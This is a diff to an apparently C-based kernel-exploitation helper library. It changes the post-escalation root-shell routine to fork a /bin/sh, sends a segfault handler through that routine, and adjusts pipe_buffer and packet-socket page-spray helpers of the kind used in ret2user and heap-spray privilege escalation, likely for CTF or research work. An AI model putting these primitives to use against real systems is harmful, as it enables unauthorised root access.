@@ -64,7 +64,14 @@ void panic(const char *text){
 }
 void shell(){
     if(!getuid())
-        system("/bin/sh");
+    {
+        if(!fork()){
+            system("/bin/sh");
+        }
+        else{
+            sleep(3600);
+        }
+    }
     else
         panic("[!] Failed to Escape");
 }
@@ -197,7 +204,7 @@ save_status for ret2user
 void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
     
     info("Libx: SegFault Handler is spwaning a shell...");
-    system("/bin/sh");
+    shell();
     while(1); // Techniquly, we never his this line
 }
 void hook_segfault(){
@@ -563,7 +570,7 @@ void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
         write(pipe_fd[i][1], "pipe_buffer init", 17)>=0;
     }
 }
-void initPipeBuffern(int pipe_fd[PIPE_NUM][2],int num){
+void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
     assert(num<=PIPE_NUM);
 
     for(int i  = 0 ; i < num ; i++)
@@ -682,7 +689,7 @@ int _alloc_pages_via_sock(uint32_t size, uint32_t n)
     req.tp_block_nr = n;
     req.tp_frame_size = 4096;
     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
-
+    
     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
     {
         perror("setsockopt PACKET_TX_RING failed");
@@ -724,6 +731,7 @@ void spaCmd(enum spray_cmd cmd, int idx)
     read(sock_allocator_fd_parent[0], &result, sizeof(result));
     assert(result == idx);
 }
+
 void spaInit(){
     pipe(sock_allocator_fd_child);
     pipe(sock_allocator_fd_parent);
